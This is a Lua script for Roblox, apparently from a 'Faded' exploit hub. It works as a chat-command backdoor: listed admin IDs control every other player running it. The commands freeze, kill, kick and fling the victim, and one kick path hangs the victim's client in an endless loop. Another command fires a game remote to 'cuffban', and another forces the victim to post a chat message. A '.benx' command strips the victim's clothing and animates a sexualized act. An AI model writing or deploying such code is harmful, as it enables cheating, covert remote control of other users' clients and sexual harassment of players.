IsMod = true
DisableMod = false
local bending = false
local kickmsg = 'PERMA BANNED'
local player = game.Players.LocalPlayer
local function commands(msg,plr)
if DisableMod == false or table.find(fadmins, plr) then
local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
local Msg = string.lower(msg)
local SplitCMD = string.split(Msg,' ')
local Lower = string.lower(player.Name)
local Allowed = string.find(Lower, SplitCMD[2])
if Allowed then
if string.find(SplitCMD[1], '.freeze') and DisableMod == false then
player.Character.HumanoidRootPart.Anchored = true
end
if string.find(SplitCMD[1], '.unfreeze') and DisableMod == false then
player.Character.HumanoidRootPart.Anchored = false
end
if string.find(SplitCMD[1], '.benx') and DisableMod == false then
bending = true
local segtarget = Mod.Name
local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
Crouch.Looped = true
Crouch:Play()
local away = .5
local reversing = false
local shirt = player.Character:FindFirstChild('Shirt')
local pants = player.Character:FindFirstChild('Pants')
if shirt then
shirt:Destroy()
end
if pants then
pants:Destroy()
end
local Loop
local loopFunction = function()
local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
local character = player.Character
if targetchar then
if reversing == true then
away = away - 0.1
else
away = away + 0.1
end
if away >= 2 then
reversing = true
elseif away < 0.5 then
reversing = false
end
character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
end
end;
local Start = function()
Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
end;
local Pause = function()
Loop:Disconnect()
Crouch:Stop()
end;
Start()	
repeat wait() until bending == false
Pause()
end
if string.find(SplitCMD[1], '.unbenx') and DisableMod == false then
while bending == true do
wait()
bending = false
end
end
if string.find(SplitCMD[1], '.juicewrld') and DisableMod == false then
game.Players.LocalPlayer.Character.HumanoidRootPart:Destroy()
while wait() do
local humanoid = game.Players.LocalPlayer.Character.Humanoid
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
wait(5)
	game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
local localPlayer = game:GetService('Players').LocalPlayer;
local localCharacter = localPlayer.Character;
end
if string.find(SplitCMD[1], '.kill') and DisableMod == false then
	game.Players.LocalPlayer.Character.Humanoid.Health = 0
end 
if string.find(SplitCMD[1], '.kick') and DisableMod == false then
local ISADMIN = table.find(fadmins, player.UserId)
if not ISADMIN then
kickmsg = Mod.Name
player:Kick(kickmsg)
wait(5)
while true do end
end
end
if string.find(SplitCMD[1], '.bring') and DisableMod == false then
player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
end
if string.find(SplitCMD[1], '.cuffban') then
if table.find(fadners, plr) then
local ISADMIN = table.find(fadners, player.UserId)
if not ISADMIN then
game.ReplicatedStorage.MainEvent:FireServer("CHECKER_1", p2) 
end
end
end
if string.find(SplitCMD[1], '.fling') and DisableMod == false then
player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
end
else
if string.find(msg, '/e find') and DisableMod == false then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Faded is winning", 'All');
end
if string.find(msg, '/e immune') then
if IsMod == true then
DisableMod = true
game.StarterGui:SetCore("SendNotification", {
		 Title = "Faded Mod Perms";
		 Text = "you now have immunity from mod perms";
		 Icon = "rbxassetid://6130118019";
		 Duration = 20;
	 })
end
end
if string.find(msg, '/e unimmune') then
if IsMod == true then
DisableMod = false
	 game.StarterGui:SetCore("SendNotification", {
		 Title = "Faded Mod Perms";
		 Text = "you no longer have immunity from mod perms";
		 Icon = "rbxassetid://6130118019";
		 Duration = 20;
	})
end
end
end
end
end
if table.find(fadmins, game.Players.LocalPlayer.UserId) then
game.StarterGui:SetCore("SendNotification", {
		 Title = "Faded Mod Perms";
		 Text = "Welcome to Mod Perms";
		 Icon = "rbxassetid://6130118019";
		 Duration = 20;
})
end
if table.find(fadners, game.Players.LocalPlayer.UserId) then
game.StarterGui:SetCore("SendNotification", {
		 Title = "Faded Owner Perms";
		 Text = "wsp, you have owner perms";
		 Icon = "rbxassetid://6130118019";
		 Duration = 20;
})
end
game:GetService('Players').PlayerAdded:Connect(function(plr)
local FADMIN = table.find(fadmins, plr.UserId)
if FADMIN then
plr.Chatted:Connect(function(msg)
commands(msg, plr.UserId)
end)
end
end)
for i,v in pairs(game:GetService('Players'):GetChildren()) do
local FADMIN = table.find(fadmins, v.UserId)
if FADMIN then
v.Chatted:Connect(function(msg)
commands(msg, v.UserId)
end)
end
end
